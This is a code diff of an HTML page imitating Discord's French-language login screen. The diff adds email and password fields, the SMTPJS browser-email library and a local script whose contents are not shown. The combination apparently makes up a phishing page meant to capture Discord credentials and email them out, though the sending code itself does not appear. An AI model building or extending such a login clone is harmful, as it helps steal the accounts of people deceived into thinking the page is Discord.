@@ -7,7 +7,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel = "icon" href = 
     "https://static.vecteezy.com/system/resources/previews/023/986/880/non_2x/discord-logo-discord-logo-transparent-discord-icon-transparent-free-free-png.png" 
-            type = "image/x-icon">
+    type = "image/x-icon">
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
     <title>Discord</title>
 </head>
 <body>
@@ -20,15 +21,17 @@
         <h4>Ha, te revoilà !</h4>
     </div>
     <section class="main">
-            <div class="form">
+        <form class="form-contact" action="#">
                 <p class="mel">EMAIL OU NUMÉRO DE TÉLÉPHONE<span class="red"> *</span></p>
-                <input type="text" name="" id="">
+                <input type="text" name="" id="email">
                 <p class="mel">MOT DE PASSE<span class="red"> *</span></p>
-                <input type="text" name="" id="">
+                <input type="password" name="" id="password">
                 <p class="blue mel">Tu as oublié ton mot de passe ?</p>
-                <a href="">Connexion</a>
+                <input type="submit" value="Connexion">
                 <p class="grey mel">Besoin d'un compte ? <span class="blue">S'inscrire</span></p>
-            </div>
+            </form> 
     </section>
+
+    <script src="js/script.js"></script>
 </body>
 </html>
